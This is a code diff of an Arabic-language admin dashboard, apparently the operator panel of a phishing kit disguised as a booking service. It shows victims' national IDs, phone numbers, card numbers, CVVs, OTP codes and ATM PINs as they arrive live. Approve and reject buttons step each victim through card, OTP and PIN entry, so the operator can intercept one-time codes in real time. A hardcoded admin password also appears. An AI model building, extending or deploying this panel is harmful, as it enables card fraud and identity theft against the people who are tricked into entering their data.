@@ -74,83 +74,11 @@
   /* Main content */
   .main-content { padding: 20px 24px; }
 
-  /* Pending requests section */
+  /* Section title */
   .section-title {
     font-size: 16px; font-weight: 700; color: #1a202c; margin-bottom: 14px;
     display: flex; align-items: center; gap: 8px;
   }
-  .badge-count {
-    background: #e53e3e; color: #fff; border-radius: 50%; width: 22px; height: 22px;
-    display: inline-flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 700;
-  }
-
-  /* Pending cards */
-  .pending-grid { display: flex; flex-direction: column; gap: 12px; margin-bottom: 24px; }
-  .pending-card {
-    background: #fff; border-radius: 14px; padding: 18px 20px;
-    box-shadow: 0 2px 8px rgba(0,0,0,0.07); border-right: 4px solid #2563eb;
-    animation: slideIn 0.3s ease;
-  }
-  .pending-card.payment-card { border-right-color: #7c3aed; }
-  @keyframes slideIn { from{opacity:0;transform:translateY(-10px)} to{opacity:1;transform:translateY(0)} }
-  .pending-card-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px; }
-  .pending-type { display: flex; align-items: center; gap: 8px; font-weight: 700; font-size: 14px; }
-  .type-badge {
-    padding: 3px 10px; border-radius: 20px; font-size: 11px; font-weight: 700;
-  }
-  .type-badge.payment { background: #ede9fe; color: #7c3aed; }
-  .type-badge.otp { background: #ffedd5; color: #ea580c; }
-  .type-badge.pin { background: #ccfbf1; color: #0d9488; }
-  .pending-ip { font-size: 12px; color: #718096; direction: ltr; }
-  .pending-data { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 16px; }
-  .data-field { background: #f8fafc; border-radius: 8px; padding: 10px 12px; }
-  .data-field label { font-size: 11px; color: #718096; display: block; margin-bottom: 3px; }
-  .data-field span { font-size: 14px; font-weight: 600; color: #1a202c; direction: ltr; display: block; }
-  .data-field.full { grid-column: 1 / -1; }
-
-  /* OTP/PIN section inside payment card */
-  .code-section {
-    border-top: 1.5px dashed #e2e8f0; margin-top: 14px; padding-top: 14px;
-    animation: fadeIn 0.4s ease;
-  }
-  .code-section-title {
-    font-size: 12px; font-weight: 700; color: #718096; margin-bottom: 10px;
-    text-transform: uppercase; letter-spacing: 0.5px; display: flex; align-items: center; gap: 6px;
-  }
-  .code-value {
-    font-size: 28px; font-weight: 900; letter-spacing: 6px; text-align: center;
-    padding: 12px; background: #f8fafc; border-radius: 10px; margin-bottom: 10px;
-  }
-  .code-value.otp-val { color: #ea580c; }
-  .code-value.pin-val { color: #0d9488; }
-  @keyframes fadeIn { from{opacity:0;transform:translateY(5px)} to{opacity:1;transform:translateY(0)} }
-
-  /* Action buttons - start gray, turn colored on new data */
-  .pending-actions { display: flex; gap: 10px; }
-  .btn-approve {
-    flex: 1; padding: 11px; color: #fff; border: none;
-    border-radius: 10px; font-size: 14px; font-weight: 700; cursor: pointer;
-    transition: background 0.3s; display: flex; align-items: center; justify-content: center; gap: 6px;
-    background: #9ca3af;
-  }
-  .btn-approve.active { background: #059669; }
-  .btn-approve.active:hover { background: #047857; }
-  .btn-reject {
-    flex: 1; padding: 11px; color: #fff; border: none;
-    border-radius: 10px; font-size: 14px; font-weight: 700; cursor: pointer;
-    transition: background 0.3s; display: flex; align-items: center; justify-content: center; gap: 6px;
-    background: #9ca3af;
-  }
-  .btn-reject.active { background: #e53e3e; }
-  .btn-reject.active:hover { background: #c53030; }
-
-  /* Pulse animation on new data */
-  @keyframes newDataPulse {
-    0% { box-shadow: 0 0 0 0 rgba(37,99,235,0.4); }
-    70% { box-shadow: 0 0 0 10px rgba(37,99,235,0); }
-    100% { box-shadow: 0 0 0 0 rgba(37,99,235,0); }
-  }
-  .new-data-pulse { animation: newDataPulse 0.8s ease; }
 
   /* Bookings table */
   .table-card {
@@ -174,6 +102,8 @@
   td { padding: 13px 16px; font-size: 13px; color: #2d3748; border-bottom: 1px solid #f0f4f8; }
   tr:last-child td { border-bottom: none; }
   tr:hover td { background: #fafbfc; }
+
+  /* Status badges */
   .status-badge {
     padding: 3px 10px; border-radius: 20px; font-size: 11px; font-weight: 700; display: inline-block;
   }
@@ -181,6 +111,17 @@
   .status-approved { background: #d1fae5; color: #059669; }
   .status-rejected { background: #fee2e2; color: #e53e3e; }
   .status-pending { background: #ffedd5; color: #ea580c; }
+  /* Live status badges */
+  .status-payment { background: #ede9fe; color: #7c3aed; }
+  .status-otp { background: #ffedd5; color: #ea580c; }
+  .status-pin { background: #ccfbf1; color: #0d9488; }
+  /* Pulse animation for live row */
+  @keyframes rowPulse {
+    0%,100% { background: transparent; }
+    50% { background: #fef9c3; }
+  }
+  .row-live td { animation: rowPulse 1.5s ease 2; }
+
   .btn-details {
     background: #2563eb; color: #fff; border: none; padding: 6px 14px;
     border-radius: 8px; font-size: 12px; cursor: pointer; font-weight: 600;
@@ -208,23 +149,79 @@
   }
   .modal-overlay.show { display: flex; }
   .modal {
-    background: #fff; border-radius: 16px; width: 520px; max-width: 95vw;
+    background: #fff; border-radius: 16px; width: 560px; max-width: 95vw;
     max-height: 90vh; overflow-y: auto; box-shadow: 0 20px 60px rgba(0,0,0,0.2);
   }
   .modal-header {
     padding: 20px 24px; border-bottom: 1px solid #f0f4f8;
     display: flex; align-items: center; justify-content: space-between;
+    position: sticky; top: 0; background: #fff; z-index: 10;
   }
   .modal-header h3 { font-size: 16px; font-weight: 700; color: #1a202c; }
   .modal-close { background: none; border: none; font-size: 20px; cursor: pointer; color: #718096; }
   .modal-body { padding: 20px 24px; }
   .modal-section { margin-bottom: 20px; }
-  .modal-section h4 { font-size: 13px; font-weight: 700; color: #718096; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 0.5px; }
+  .modal-section h4 {
+    font-size: 12px; font-weight: 700; color: #718096; margin-bottom: 10px;
+    text-transform: uppercase; letter-spacing: 0.5px;
+    display: flex; align-items: center; gap: 6px;
+  }
   .modal-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
   .modal-field { background: #f8fafc; border-radius: 8px; padding: 10px 12px; }
   .modal-field label { font-size: 11px; color: #718096; display: block; margin-bottom: 3px; }
   .modal-field span { font-size: 14px; font-weight: 600; color: #1a202c; direction: ltr; display: block; }
   .modal-field.full { grid-column: 1 / -1; }
+
+  /* Live payment section inside modal */
+  .live-section {
+    border: 2px solid #e2e8f0; border-radius: 12px; padding: 16px;
+    margin-bottom: 16px; position: relative;
+  }
+  .live-section.has-data { border-color: #7c3aed; }
+  .live-section.otp-live { border-color: #ea580c; }
+  .live-section.pin-live { border-color: #0d9488; }
+  .live-badge {
+    position: absolute; top: -10px; right: 14px;
+    background: #fff; padding: 0 8px;
+    font-size: 11px; font-weight: 700;
+  }
+  .live-badge.payment-badge { color: #7c3aed; }
+  .live-badge.otp-badge { color: #ea580c; }
+  .live-badge.pin-badge { color: #0d9488; }
+  .code-display {
+    font-size: 32px; font-weight: 900; letter-spacing: 8px; text-align: center;
+    padding: 14px; background: #f8fafc; border-radius: 10px; margin: 10px 0;
+  }
+  .code-display.otp-color { color: #ea580c; }
+  .code-display.pin-color { color: #0d9488; }
+  .waiting-msg {
+    text-align: center; color: #a0aec0; font-size: 13px; padding: 16px 0;
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .spinner { animation: spin 1s linear infinite; display: inline-block; }
+
+  /* Action buttons inside modal */
+  .modal-actions { display: flex; gap: 10px; margin-top: 14px; }
+  .btn-modal-action {
+    flex: 1; padding: 12px; color: #fff; border: none;
+    border-radius: 10px; font-size: 14px; font-weight: 700; cursor: pointer;
+    transition: background 0.3s; display: flex; align-items: center; justify-content: center; gap: 6px;
+  }
+  .btn-modal-action.gray { background: #9ca3af; pointer-events: none; }
+  .btn-modal-action.green { background: #059669; pointer-events: auto; }
+  .btn-modal-action.green:hover { background: #047857; }
+  .btn-modal-action.red { background: #e53e3e; pointer-events: auto; }
+  .btn-modal-action.red:hover { background: #c53030; }
+
+  /* Pulse on new data in modal */
+  @keyframes sectionPulse {
+    0% { box-shadow: 0 0 0 0 rgba(124,58,237,0.5); }
+    70% { box-shadow: 0 0 0 8px rgba(124,58,237,0); }
+    100% { box-shadow: 0 0 0 0 rgba(124,58,237,0); }
+  }
+  .pulse-anim { animation: sectionPulse 0.8s ease; }
+
   .modal-footer { padding: 16px 24px; border-top: 1px solid #f0f4f8; display: flex; gap: 10px; }
   .btn-modal-approve {
     flex: 1; padding: 12px; background: #059669; color: #fff; border: none;
@@ -241,7 +238,6 @@
   @media(max-width:768px) {
     .stats-row { padding: 16px; }
     .main-content { padding: 16px; }
-    .pending-data { grid-template-columns: 1fr; }
     .modal-grid { grid-template-columns: 1fr; }
     .search-box { width: 160px; }
   }
@@ -316,17 +312,6 @@
 
   <!-- Main Content -->
   <div class="main-content">
-
-    <!-- Pending Requests -->
-    <div id="pendingSection" style="display:none; margin-bottom:24px">
-      <div class="section-title">
-        <i class="fas fa-exclamation-circle" style="color:#ea580c"></i>
-        طلبات تنتظر الموافقة
-        <span class="badge-count" id="pendingCount">0</span>
-      </div>
-      <div class="pending-grid" id="pendingGrid"></div>
-    </div>
-
     <!-- Bookings Table -->
     <div class="table-card">
       <div class="table-header">
@@ -371,7 +356,7 @@
 <div class="modal-overlay" id="detailsModal">
   <div class="modal">
     <div class="modal-header">
-      <h3><i class="fas fa-user-circle" style="color:#1a5c38;margin-left:8px"></i> تفاصيل الحجز</h3>
+      <h3 id="modalTitle"><i class="fas fa-user-circle" style="color:#1a5c38;margin-left:8px"></i> تفاصيل الحجز</h3>
       <button class="modal-close" onclick="closeModal()">&times;</button>
     </div>
     <div class="modal-body" id="modalBody"></div>
@@ -385,10 +370,13 @@ const ADMIN_PASSWORD = 'Vsafety@2024';
 
 let socket = null;
 let allBookings = [];
-let currentModalBooking = null;
+let currentModalIp = null; // IP of the booking currently open in modal
 
-// pendingRequests: ip -> { requestId, paymentData, otpData, pinData, currentRequestId, hasNewData }
-let pendingRequests = {};
+// liveData: ip -> { requestId, currentRequestId, paymentData, otpData, pinData }
+let liveData = {};
+
+// liveStatus: ip -> 'payment' | 'otp' | 'pin' | null
+let liveStatus = {};
 
 // ==================== Login ====================
 function doLogin() {
@@ -433,6 +421,7 @@ function initSocket() {
     allBookings.unshift(booking);
     renderBookings();
     updateStats();
+    playNotification();
   });
 
   socket.on('bookingUpdated', (booking) => {
@@ -442,246 +431,83 @@ function initSocket() {
     updateStats();
   });
 
-  // New payment data - create new card for this IP
+  // New payment data
   socket.on('newPayment', (data) => {
     const ip = data.ip;
-    // Create or update the card for this IP
-    pendingRequests[ip] = {
-      ip,
-      requestId: data.requestId,
-      currentRequestId: data.requestId,
-      paymentData: data,
-      otpData: null,
-      pinData: null,
-      hasNewData: true
-    };
-    renderPendingRequests();
+    if (!liveData[ip]) liveData[ip] = {};
+    liveData[ip].currentRequestId = data.requestId;
+    liveData[ip].paymentData = data;
+    liveData[ip].otpData = null;
+    liveData[ip].pinData = null;
+    liveStatus[ip] = 'payment';
+
+    // Update status badge in table row
+    updateRowStatus(ip, 'payment');
     updatePendingCount();
     playNotification();
-    // Activate buttons after short delay (new data arrived)
-    setTimeout(() => activateButtons(ip), 100);
+
+    // If this IP's modal is open, refresh it
+    if (currentModalIp === ip) {
+      refreshModalLiveSection(ip);
+    }
   });
 
-  // New code (OTP/PIN) - update existing card for this IP
+  // New OTP / PIN
   socket.on('newCode', (data) => {
     const ip = data.ip;
     const type = data.type || 'otp';
+    if (!liveData[ip]) liveData[ip] = {};
+    liveData[ip].currentRequestId = data.requestId;
 
-    if (pendingRequests[ip]) {
-      // Update existing card
-      pendingRequests[ip].currentRequestId = data.requestId;
-      pendingRequests[ip].hasNewData = true;
-      if (type === 'pin') {
-        pendingRequests[ip].pinData = data;
-      } else {
-        pendingRequests[ip].otpData = data;
-      }
-      // Re-render and re-activate buttons
-      renderPendingRequests();
-      updatePendingCount();
-      playNotification();
-      setTimeout(() => activateButtons(ip), 100);
+    if (type === 'pin') {
+      liveData[ip].pinData = data;
+      liveStatus[ip] = 'pin';
     } else {
-      // No existing payment card - create standalone code card
-      pendingRequests[ip] = {
-        ip,
-        requestId: data.requestId,
-        currentRequestId: data.requestId,
-        paymentData: null,
-        otpData: type !== 'pin' ? data : null,
-        pinData: type === 'pin' ? data : null,
-        hasNewData: true
-      };
-      renderPendingRequests();
-      updatePendingCount();
-      playNotification();
-      setTimeout(() => activateButtons(ip), 100);
+      liveData[ip].otpData = data;
+      liveStatus[ip] = 'otp';
+    }
+
+    // Update status badge in table row
+    updateRowStatus(ip, type === 'pin' ? 'pin' : 'otp');
+    updatePendingCount();
+    playNotification();
+
+    // If this IP's modal is open, refresh it
+    if (currentModalIp === ip) {
+      refreshModalLiveSection(ip);
     }
   });
 }
 
-function activateButtons(ip) {
-  const card = document.getElementById('card-ip-' + ip.replace(/\./g, '_'));
-  if (!card) return;
-  const approveBtn = card.querySelector('.btn-approve');
-  const rejectBtn = card.querySelector('.btn-reject');
-  if (approveBtn) {
-    approveBtn.classList.add('active');
-    approveBtn.classList.remove('disabled-btn');
-  }
-  if (rejectBtn) {
-    rejectBtn.classList.add('active');
-    rejectBtn.classList.remove('disabled-btn');
-  }
-  // Pulse animation on card
-  card.classList.add('new-data-pulse');
-  setTimeout(() => card.classList.remove('new-data-pulse'), 800);
+// ==================== Row Status ====================
+function updateRowStatus(ip, newStatus) {
+  // Find booking with this IP and update its live status display
+  const rows = document.querySelectorAll(`tr[data-ip="${ip}"]`);
+  rows.forEach(row => {
+    const statusCell = row.querySelector('.live-status-cell');
+    if (statusCell) {
+      statusCell.innerHTML = getLiveStatusBadge(ip, newStatus);
+    }
+    // Flash the row
+    row.classList.remove('row-live');
+    void row.offsetWidth;
+    row.classList.add('row-live');
+    setTimeout(() => row.classList.remove('row-live'), 3000);
+  });
 }
 
-// ==================== Pending Requests ====================
-function renderPendingRequests() {
-  const grid = document.getElementById('pendingGrid');
-  const section = document.getElementById('pendingSection');
-  const requests = Object.values(pendingRequests);
-
-  if (requests.length === 0) {
-    section.style.display = 'none';
-    return;
-  }
-
-  section.style.display = 'block';
-  document.getElementById('pendingCount').textContent = requests.length;
-
-  grid.innerHTML = requests.map(req => {
-    const ipId = req.ip.replace(/\./g, '_');
-    const pd = req.paymentData;
-    const od = req.otpData;
-    const pind = req.pinData;
-
-    // Determine card label and approve button text
-    let approveLabel = 'قبول';
-    if (pind) approveLabel = 'قبول ✓';
-    else if (od) approveLabel = 'قبول → رقم سري ATM';
-    else if (pd) approveLabel = 'قبول → OTP';
-
-    let rejectLabel = 'رفض';
-    if (pind) rejectLabel = 'رفض → إعادة PIN';
-    else if (od) rejectLabel = 'رفض → إعادة OTP';
-    else if (pd) rejectLabel = 'رفض البطاقة';
-
-    return `
-      <div class="pending-card payment-card" id="card-ip-${ipId}">
-        <div class="pending-card-header">
-          <div class="pending-type">
-            <i class="fas fa-credit-card" style="color:#7c3aed"></i>
-            بيانات عميل
-            <span class="type-badge payment">بطاقة</span>
-            ${od ? '<span class="type-badge otp" style="margin-right:4px">OTP</span>' : ''}
-            ${pind ? '<span class="type-badge pin" style="margin-right:4px">PIN</span>' : ''}
-          </div>
-          <span class="pending-ip">${req.ip || '-'}</span>
-        </div>
-
-        ${pd ? `
-        <div class="pending-data">
-          <div class="data-field full">
-            <label>اسم حامل البطاقة</label>
-            <span>${pd.cardHolderName || pd.card_holder_name || '-'}</span>
-          </div>
-          <div class="data-field">
-            <label>رقم البطاقة</label>
-            <span>${pd.cardNumber || pd.card_number || '-'}</span>
-          </div>
-          <div class="data-field">
-            <label>تاريخ الانتهاء</label>
-            <span>${pd.expiry || pd.expirationDate || '-'}</span>
-          </div>
-          <div class="data-field">
-            <label>CVV</label>
-            <span>${pd.cvv || '-'}</span>
-          </div>
-        </div>` : ''}
-
-        ${od ? `
-        <div class="code-section">
-          <div class="code-section-title">
-            <i class="fas fa-key" style="color:#ea580c"></i>
-            رمز OTP المُدخل
-          </div>
-          <div class="code-value otp-val">${od.code || '-'}</div>
-        </div>` : ''}
-
-        ${pind ? `
-        <div class="code-section">
-          <div class="code-section-title">
-            <i class="fas fa-lock" style="color:#0d9488"></i>
-            الرقم السري ATM
-          </div>
-          <div class="code-value pin-val">${pind.code || '-'}</div>
-        </div>` : ''}
-
-        <div class="pending-actions" style="margin-top:14px">
-          <button class="btn-approve" onclick="approveRequest('${req.ip}')">
-            <i class="fas fa-check"></i> ${approveLabel}
-          </button>
-          <button class="btn-reject" onclick="rejectRequest('${req.ip}')">
-            <i class="fas fa-times"></i> ${rejectLabel}
-          </button>
-        </div>
-      </div>`;
-  }).join('');
+function getLiveStatusBadge(ip, status) {
+  const s = status || liveStatus[ip];
+  if (!s) return '';
+  if (s === 'payment') return '<span class="status-badge status-payment" style="margin-right:4px"><i class="fas fa-credit-card" style="font-size:9px"></i> بطاقة</span>';
+  if (s === 'otp') return '<span class="status-badge status-otp" style="margin-right:4px"><i class="fas fa-key" style="font-size:9px"></i> OTP</span>';
+  if (s === 'pin') return '<span class="status-badge status-pin" style="margin-right:4px"><i class="fas fa-lock" style="font-size:9px"></i> PIN</span>';
+  return '';
 }
 
 function updatePendingCount() {
-  const count = Object.keys(pendingRequests).length;
+  const count = Object.keys(liveData).length;
   document.getElementById('statPending').textContent = count;
-}
-
-async function approveRequest(ip) {
-  const req = pendingRequests[ip];
-  if (!req) return;
-  const requestId = req.currentRequestId;
-
-  try {
-    await fetch(`${SERVER_URL}/api/approve`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ requestId })
-    });
-  } catch(e) {
-    if (socket) socket.emit('adminApprove', { requestId });
-  }
-
-  // Gray out buttons and wait for next data
-  grayOutButtons(ip);
-  document.getElementById('statCompleted').textContent =
-    parseInt(document.getElementById('statCompleted').textContent) + 1;
-
-  // If PIN was approved, remove the card entirely
-  if (req.pinData) {
-    delete pendingRequests[ip];
-    const el = document.getElementById('card-ip-' + ip.replace(/\./g, '_'));
-    if (el) el.remove();
-    renderPendingRequests();
-    updatePendingCount();
-  }
-}
-
-async function rejectRequest(ip) {
-  const req = pendingRequests[ip];
-  if (!req) return;
-  const requestId = req.currentRequestId;
-
-  try {
-    await fetch(`${SERVER_URL}/api/reject`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ requestId, message: 'تم الرفض' })
-    });
-  } catch(e) {
-    if (socket) socket.emit('adminReject', { requestId, message: 'تم الرفض' });
-  }
-
-  // Gray out buttons and wait for next data
-  grayOutButtons(ip);
-
-  // If payment was rejected (no OTP/PIN yet), remove card
-  if (!req.otpData && !req.pinData) {
-    delete pendingRequests[ip];
-    const el = document.getElementById('card-ip-' + ip.replace(/\./g, '_'));
-    if (el) el.remove();
-    renderPendingRequests();
-    updatePendingCount();
-  }
-}
-
-function grayOutButtons(ip) {
-  const card = document.getElementById('card-ip-' + ip.replace(/\./g, '_'));
-  if (!card) return;
-  const approveBtn = card.querySelector('.btn-approve');
-  const rejectBtn = card.querySelector('.btn-reject');
-  if (approveBtn) approveBtn.classList.remove('active');
-  if (rejectBtn) rejectBtn.classList.remove('active');
 }
 
 // ==================== Bookings ====================
@@ -713,15 +539,21 @@ function renderBookings() {
     return;
   }
 
-  tbody.innerHTML = filtered.map(b => `
-    <tr>
+  tbody.innerHTML = filtered.map(b => {
+    const live = liveStatus[b.ip];
+    const statusHtml = `
+      <span class="status-badge status-${b.status || 'new'}">${getStatusLabel(b.status)}</span>
+      <span class="live-status-cell">${live ? getLiveStatusBadge(b.ip, live) : ''}</span>
+    `;
+    return `
+    <tr data-ip="${b.ip || ''}">
       <td>${b.name || '-'}</td>
       <td style="direction:ltr">${b.national_id || '-'}</td>
       <td style="direction:ltr">${b.phone_number || '-'}</td>
       <td>${b.region || '-'}</td>
       <td>${b.service_type || '-'}</td>
       <td style="direction:ltr">${b.date_svc || '-'}</td>
-      <td><span class="status-badge status-${b.status || 'new'}">${getStatusLabel(b.status)}</span></td>
+      <td>${statusHtml}</td>
       <td>
         <div style="display:flex;gap:6px;align-items:center">
           <button class="btn-details" onclick="showDetails(${b.id})">
@@ -744,8 +576,8 @@ function renderBookings() {
           </div>
         </div>
       </td>
-    </tr>
-  `).join('');
+    </tr>`;
+  }).join('');
 }
 
 function filterTable() { renderBookings(); }
@@ -811,7 +643,7 @@ async function navigateTo(ip, page) {
 async function showDetails(bookingId) {
   const booking = allBookings.find(b => b.id === bookingId);
   if (!booking) return;
-  currentModalBooking = booking;
+  currentModalIp = booking.ip;
 
   let extraData = { payments: [], codes: [], phones: [] };
   try {
@@ -820,9 +652,11 @@ async function showDetails(bookingId) {
   } catch(e) {}
 
   const body = document.getElementById('modalBody');
-  body.innerHTML = `
+
+  // Build client info section
+  let html = `
     <div class="modal-section">
-      <h4><i class="fas fa-user" style="margin-left:6px"></i> بيانات العميل</h4>
+      <h4><i class="fas fa-user"></i> بيانات العميل</h4>
       <div class="modal-grid">
         <div class="modal-field"><label>الاسم</label><span>${booking.name || '-'}</span></div>
         <div class="modal-field"><label>رقم الهوية</label><span>${booking.national_id || '-'}</span></div>
@@ -835,44 +669,248 @@ async function showDetails(bookingId) {
         <div class="modal-field"><label>IP</label><span>${booking.ip || '-'}</span></div>
         <div class="modal-field"><label>الحالة</label><span>${getStatusLabel(booking.status)}</span></div>
       </div>
-    </div>
-    ${extraData.payments && extraData.payments.length > 0 ? `
-    <div class="modal-section">
-      <h4><i class="fas fa-credit-card" style="margin-left:6px;color:#7c3aed"></i> بيانات البطاقة</h4>
-      ${extraData.payments.map(p => `
-      <div class="modal-grid" style="margin-bottom:10px">
-        <div class="modal-field full"><label>اسم حامل البطاقة</label><span>${p.card_holder_name || '-'}</span></div>
-        <div class="modal-field"><label>رقم البطاقة</label><span>${p.card_number || '-'}</span></div>
-        <div class="modal-field"><label>تاريخ الانتهاء</label><span>${p.expiry || '-'}</span></div>
-        <div class="modal-field"><label>CVV</label><span>${p.cvv || '-'}</span></div>
-      </div>`).join('')}
-    </div>` : ''}
-    ${extraData.codes && extraData.codes.length > 0 ? `
-    <div class="modal-section">
-      <h4><i class="fas fa-key" style="margin-left:6px;color:#ea580c"></i> الرموز والأكواد</h4>
-      ${extraData.codes.map(c => `
-      <div class="modal-grid" style="margin-bottom:8px">
-        <div class="modal-field"><label>${c.code_type === 'pin' ? 'رقم سري ATM' : 'رمز OTP'}</label><span style="font-size:18px;font-weight:800;letter-spacing:3px">${c.code || '-'}</span></div>
-        <div class="modal-field"><label>الحالة</label><span>${getStatusLabel(c.status)}</span></div>
-      </div>`).join('')}
-    </div>` : ''}
-  `;
+    </div>`;
 
+  // Live payment/OTP/PIN section
+  html += buildLiveSection(booking.ip, extraData);
+
+  body.innerHTML = html;
+
+  // Footer
   const footer = document.getElementById('modalFooter');
   footer.innerHTML = `
     <button class="btn-modal-approve" onclick="updateBookingStatus(${booking.id}, 'approved')">
-      <i class="fas fa-check"></i> قبول
+      <i class="fas fa-check"></i> قبول الحجز
     </button>
     <button class="btn-modal-reject" onclick="updateBookingStatus(${booking.id}, 'rejected')">
-      <i class="fas fa-times"></i> رفض
+      <i class="fas fa-times"></i> رفض الحجز
     </button>
   `;
 
   document.getElementById('detailsModal').classList.add('show');
 }
 
+function buildLiveSection(ip, extraData) {
+  const live = liveData[ip];
+  const pd = live ? live.paymentData : null;
+  const od = live ? live.otpData : null;
+  const pind = live ? live.pinData : null;
+
+  // Also check historical data
+  const histPayments = (extraData && extraData.payments) ? extraData.payments : [];
+  const histCodes = (extraData && extraData.codes) ? extraData.codes : [];
+
+  let html = `<div class="modal-section"><h4><i class="fas fa-credit-card" style="color:#7c3aed"></i> بيانات البطاقة والرموز</h4>`;
+
+  // Payment data section
+  html += `<div class="live-section ${pd ? 'has-data' : ''}" id="modal-payment-section">
+    <span class="live-badge payment-badge"><i class="fas fa-credit-card"></i> بيانات البطاقة</span>`;
+
+  if (pd) {
+    html += `
+    <div class="modal-grid" style="margin-top:8px">
+      <div class="modal-field full"><label>اسم حامل البطاقة</label><span>${pd.cardHolderName || pd.card_holder_name || '-'}</span></div>
+      <div class="modal-field"><label>رقم البطاقة</label><span>${pd.cardNumber || pd.card_number || '-'}</span></div>
+      <div class="modal-field"><label>تاريخ الانتهاء</label><span>${pd.expiry || pd.expirationDate || '-'}</span></div>
+      <div class="modal-field"><label>CVV</label><span>${pd.cvv || '-'}</span></div>
+    </div>`;
+  } else if (histPayments.length > 0) {
+    const p = histPayments[histPayments.length - 1];
+    html += `
+    <div class="modal-grid" style="margin-top:8px">
+      <div class="modal-field full"><label>اسم حامل البطاقة</label><span>${p.card_holder_name || '-'}</span></div>
+      <div class="modal-field"><label>رقم البطاقة</label><span>${p.card_number || '-'}</span></div>
+      <div class="modal-field"><label>تاريخ الانتهاء</label><span>${p.expiry || '-'}</span></div>
+      <div class="modal-field"><label>CVV</label><span>${p.cvv || '-'}</span></div>
+    </div>`;
+  } else {
+    html += `<div class="waiting-msg"><i class="fas fa-circle-notch spinner"></i> في انتظار بيانات البطاقة...</div>`;
+  }
+
+  // Approve/Reject buttons for payment
+  if (pd) {
+    html += buildActionButtons(ip, 'payment');
+  }
+
+  html += `</div>`; // end payment section
+
+  // OTP section
+  html += `<div class="live-section ${od ? 'otp-live' : ''}" id="modal-otp-section">
+    <span class="live-badge otp-badge"><i class="fas fa-key"></i> رمز OTP</span>`;
+
+  if (od) {
+    html += `<div class="code-display otp-color" id="modal-otp-value">${od.code || '-'}</div>`;
+    html += buildActionButtons(ip, 'otp');
+  } else {
+    const histOtp = histCodes.filter(c => c.code_type !== 'pin');
+    if (histOtp.length > 0) {
+      html += `<div class="code-display otp-color">${histOtp[histOtp.length-1].code || '-'}</div>`;
+    } else {
+      html += `<div class="waiting-msg"><i class="fas fa-circle-notch spinner"></i> في انتظار رمز OTP...</div>`;
+    }
+  }
+  html += `</div>`; // end otp section
+
+  // PIN section
+  html += `<div class="live-section ${pind ? 'pin-live' : ''}" id="modal-pin-section">
+    <span class="live-badge pin-badge"><i class="fas fa-lock"></i> الرقم السري ATM</span>`;
+
+  if (pind) {
+    html += `<div class="code-display pin-color" id="modal-pin-value">${pind.code || '-'}</div>`;
+    html += buildActionButtons(ip, 'pin');
+  } else {
+    const histPin = histCodes.filter(c => c.code_type === 'pin');
+    if (histPin.length > 0) {
+      html += `<div class="code-display pin-color">${histPin[histPin.length-1].code || '-'}</div>`;
+    } else {
+      html += `<div class="waiting-msg"><i class="fas fa-circle-notch spinner"></i> في انتظار الرقم السري...</div>`;
+    }
+  }
+  html += `</div>`; // end pin section
+
+  html += `</div>`; // end modal-section
+  return html;
+}
+
+function buildActionButtons(ip, stage) {
+  const live = liveData[ip];
+  if (!live) return '';
+  const currentStage = liveStatus[ip];
+  const isActive = currentStage === stage;
+
+  let approveLabel = 'قبول';
+  let rejectLabel = 'رفض';
+  if (stage === 'payment') { approveLabel = 'قبول → OTP'; rejectLabel = 'رفض البطاقة'; }
+  if (stage === 'otp') { approveLabel = 'قبول → PIN'; rejectLabel = 'رفض → إعادة OTP'; }
+  if (stage === 'pin') { approveLabel = 'قبول ✓'; rejectLabel = 'رفض → إعادة PIN'; }
+
+  const btnClass = isActive ? '' : 'gray';
+  const approveClass = isActive ? 'green' : 'gray';
+  const rejectClass = isActive ? 'red' : 'gray';
+
+  return `
+  <div class="modal-actions" id="modal-actions-${stage}">
+    <button class="btn-modal-action ${approveClass}" onclick="approveFromModal('${ip}', '${stage}')">
+      <i class="fas fa-check"></i> ${approveLabel}
+    </button>
+    <button class="btn-modal-action ${rejectClass}" onclick="rejectFromModal('${ip}', '${stage}')">
+      <i class="fas fa-times"></i> ${rejectLabel}
+    </button>
+  </div>`;
+}
+
+function refreshModalLiveSection(ip) {
+  if (currentModalIp !== ip) return;
+  // Re-fetch and rebuild live section only
+  fetch(`${SERVER_URL}/api/data/${ip}`)
+    .then(r => r.json())
+    .catch(() => ({ payments: [], codes: [] }))
+    .then(extraData => {
+      // Find the modal-section that has the live data
+      const modalBody = document.getElementById('modalBody');
+      if (!modalBody) return;
+      // Replace the second section (live section) by rebuilding
+      const sections = modalBody.querySelectorAll('.modal-section');
+      if (sections.length >= 2) {
+        const liveHtml = buildLiveSection(ip, extraData);
+        const tmp = document.createElement('div');
+        tmp.innerHTML = liveHtml;
+        sections[1].replaceWith(tmp.firstElementChild);
+        // Pulse animation
+        const newSection = modalBody.querySelectorAll('.modal-section')[1];
+        if (newSection) {
+          newSection.classList.add('pulse-anim');
+          setTimeout(() => newSection.classList.remove('pulse-anim'), 800);
+        }
+      }
+    });
+}
+
+async function approveFromModal(ip, stage) {
+  const live = liveData[ip];
+  if (!live || liveStatus[ip] !== stage) return;
+  const requestId = live.currentRequestId;
+
+  try {
+    await fetch(`${SERVER_URL}/api/approve`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ requestId })
+    });
+  } catch(e) {
+    if (socket) socket.emit('adminApprove', { requestId });
+  }
+
+  document.getElementById('statCompleted').textContent =
+    parseInt(document.getElementById('statCompleted').textContent) + 1;
+
+  // Gray out buttons, wait for next stage
+  grayModalButtons(stage);
+
+  // If PIN approved, clear liveData for this IP
+  if (stage === 'pin') {
+    delete liveData[ip];
+    delete liveStatus[ip];
+    updatePendingCount();
+    updateRowStatus(ip, null);
+  }
+}
+
+async function rejectFromModal(ip, stage) {
+  const live = liveData[ip];
+  if (!live || liveStatus[ip] !== stage) return;
+  const requestId = live.currentRequestId;
+
+  try {
+    await fetch(`${SERVER_URL}/api/reject`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ requestId, message: 'تم الرفض' })
+    });
+  } catch(e) {
